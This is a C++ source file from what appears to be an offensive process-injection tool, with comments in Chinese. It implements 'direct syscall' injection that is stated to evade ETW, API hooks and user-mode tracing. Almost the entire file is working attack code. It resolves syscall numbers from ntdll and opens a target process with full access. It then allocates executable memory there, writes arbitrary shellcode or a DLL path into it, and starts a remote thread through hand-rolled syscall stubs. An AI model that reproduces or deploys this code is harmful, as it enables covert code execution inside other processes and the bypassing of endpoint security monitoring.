/**
 * 文件名: src/methods/method_syscall.cpp
 * 作用: 直接 Syscall 注入 — 绕过 ETW / API Hook / 用户态事件追踪
 *
 * 实现: 纯汇编 stub (.asm) + C++ 包装
 *   · x64 syscall stub 由汇编文件 (syscall_stubs_x64.asm) 提供
 *   · 包含: sys_alloc_wrapper, sys_write_wrapper, sys_create_thread_wrapper
 *   · syscall 指令直接跳转内核，绕过 ntdll.dll Hook
 *   · SSN 从本地 ntdll.dll 动态解析
 */

#include "injector_methods.h"
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>

// ===========================================================================
// 辅助: 从 ntdll.dll 中动态解析 SSN (mov eax, imm32 序列)
// ===========================================================================
static bool getSyscallNumber(const char* dllName, const char* funcName, DWORD* pSsN) {
    HMODULE hMod = LoadLibraryA(dllName);
    if (!hMod) return false;
    FARPROC pFn = GetProcAddress(hMod, funcName);
    if (!pFn) { FreeLibrary(hMod); return false; }
    unsigned char* p = reinterpret_cast<unsigned char*>(pFn);
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0xB8) {
            *pSsN = *reinterpret_cast<DWORD*>(p + i + 1);
            FreeLibrary(hMod);
            return true;
        }
    }
    FreeLibrary(hMod);
    return false;
}

// ===========================================================================
// x64 syscall stub 声明 (来自 syscall_stubs_x64.asm)
// ===========================================================================
// extern "C" DWORD sys_alloc_wrapper(DWORD ssN, HANDLE hProcess,
//                                     PVOID* pBaseAddr, ULONG zeroBits,
//                                     SIZE_T* pRegionSize,
//                                     ULONG allocType, ULONG protect);
extern "C" DWORD sys_alloc_wrapper(DWORD, HANDLE, PVOID*, ULONG, SIZE_T*, ULONG, ULONG);

// extern "C" DWORD sys_write_wrapper(DWORD ssN, HANDLE hProcess,
//                                     PVOID baseAddr, LPCVOID buffer,
//                                     SIZE_T numBytes, SIZE_T* pWritten);
extern "C" DWORD sys_write_wrapper(DWORD, HANDLE, PVOID, LPCVOID, SIZE_T, SIZE_T*);

// extern "C" DWORD sys_create_thread_wrapper(DWORD ssN, PHANDLE pThreadHandle,
//                                             ACCESS_MASK desiredAccess,
//                                             PVOID objectAttributes,
//                                             HANDLE hProcess,
//                                             PVOID startRoutine,
//                                             PVOID argument,
//                                             ULONG createFlags,
//                                             SIZE_T zeroBits,
//                                             SIZE_T stackSize,
//                                             SIZE_T maxStackSize,
//                                             PVOID attributeList);
extern "C" DWORD sys_create_thread_wrapper(DWORD, PHANDLE, ACCESS_MASK, PVOID,
    HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// ===========================================================================
// 辅助
// ===========================================================================
static bool ntSuccess(DWORD st) { return st < 0xC0000000u; }

// ===========================================================================
// 注入主体逻辑
// ===========================================================================

static PVOID syscall_alloc(HANDLE hProcess, SIZE_T size, DWORD ssN, PVOID* ppBase) {
    PVOID  p = nullptr;
    SIZE_T s = size;
    DWORD st = sys_alloc_wrapper(ssN, hProcess, &p, 0, &s,
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (ntSuccess(st) && p) { *ppBase = p; return p; }
    return nullptr;
}

static bool syscall_write(HANDLE hProcess, PVOID pRemote,
    const void* pData, SIZE_T dataSize, DWORD ssN)
{
    SIZE_T written = 0;
    DWORD st = sys_write_wrapper(ssN, hProcess, pRemote,
        pData, dataSize, &written);
    return ntSuccess(st) && written == dataSize;
}

static HANDLE syscall_create_thread(HANDLE hProcess,
    PVOID pRoutine, PVOID pArg, DWORD ssN)
{
    HANDLE h = nullptr;
    DWORD st = sys_create_thread_wrapper(ssN, &h, THREAD_ALL_ACCESS,
        nullptr, hProcess, pRoutine, pArg, FALSE, 0, 0, 0, nullptr);
    if (ntSuccess(st) && h) return h;
    return nullptr;
}

// ===========================================================================
// 公开入口
// ===========================================================================

namespace methods {

bool Inject_Syscall_Shellcode(DWORD pid, const std::vector<unsigned char>& shellcode) {
    if (shellcode.empty()) {
        std::cerr << "[-] Shellcode 为空" << std::endl;
        return false;
    }

    DWORD ssN_alloc = 0, ssN_write = 0, ssN_create = 0;
    if (!getSyscallNumber("ntdll.dll", "NtAllocateVirtualMemory", &ssN_alloc)) {
        std::cerr << "[-] 无法获取 NtAllocateVirtualMemory SSN" << std::endl; return false;
    }
    if (!getSyscallNumber("ntdll.dll", "NtWriteVirtualMemory", &ssN_write)) {
        std::cerr << "[-] 无法获取 NtWriteVirtualMemory SSN" << std::endl; return false;
    }
    if (!getSyscallNumber("ntdll.dll", "NtCreateThreadEx", &ssN_create)) {
        std::cerr << "[-] 无法获取 NtCreateThreadEx SSN" << std::endl; return false;
    }

    std::cout << "[*] SSN: NtAlloc=0x" << std::hex << ssN_alloc
              << " NtWrite=0x" << ssN_write
              << " NtCreate=0x" << ssN_create << std::dec << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess 失败: " << GetLastError() << std::endl;
        return false;
    }

    PVOID pRemote = nullptr;
    if (!syscall_alloc(hProcess, shellcode.size(), ssN_alloc, &pRemote)) {
        std::cerr << "[-] [Syscall] NtAllocateVirtualMemory 失败" << std::endl;
        CloseHandle(hProcess); return false;
    }
    std::cout << "[+] [Syscall] 远程内存已分配: 0x" << std::hex << pRemote << std::dec << std::endl;

    if (!syscall_write(hProcess, pRemote, shellcode.data(), shellcode.size(), ssN_write)) {
        std::cerr << "[-] [Syscall] NtWriteVirtualMemory 失败" << std::endl;
        CloseHandle(hProcess); return false;
    }
    std::cout << "[+] [Syscall] Shellcode 已写入" << std::endl;

    HANDLE hThread = syscall_create_thread(hProcess, pRemote, nullptr, ssN_create);
    if (!hThread) {
        std::cerr << "[-] [Syscall] NtCreateThreadEx 失败" << std::endl;
        CloseHandle(hProcess); return false;
    }

    std::cout << "[+] [Syscall] 远程线程创建成功!" << std::endl;
    WaitForSingleObject(hThread, 1000);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

bool Inject_Syscall_DLL(DWORD pid, const std::wstring& dllPath) {
    if (dllPath.empty()) return false;

    DWORD ssN_alloc = 0, ssN_write = 0, ssN_create = 0;
    if (!getSyscallNumber("ntdll.dll", "NtAllocateVirtualMemory", &ssN_alloc)) return false;
    if (!getSyscallNumber("ntdll.dll", "NtWriteVirtualMemory", &ssN_write)) return false;
    if (!getSyscallNumber("ntdll.dll", "NtCreateThreadEx", &ssN_create)) return false;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    size_t pathSize = (dllPath.length() + 1) * sizeof(wchar_t);
    PVOID pRemotePath = nullptr;
    if (!syscall_alloc(hProcess, pathSize, ssN_alloc, &pRemotePath)) {
        CloseHandle(hProcess); return false;
    }
    if (!syscall_write(hProcess, pRemotePath, dllPath.c_str(), pathSize, ssN_write)) {
        CloseHandle(hProcess); return false;
    }

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    PVOID pLoadLibrary = (PVOID)GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibrary) { CloseHandle(hProcess); return false; }

    HANDLE hThread = syscall_create_thread(hProcess, pLoadLibrary, pRemotePath, ssN_create);
    if (!hThread) { CloseHandle(hProcess); return false; }

    WaitForSingleObject(hThread, 2000);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

} // namespace methods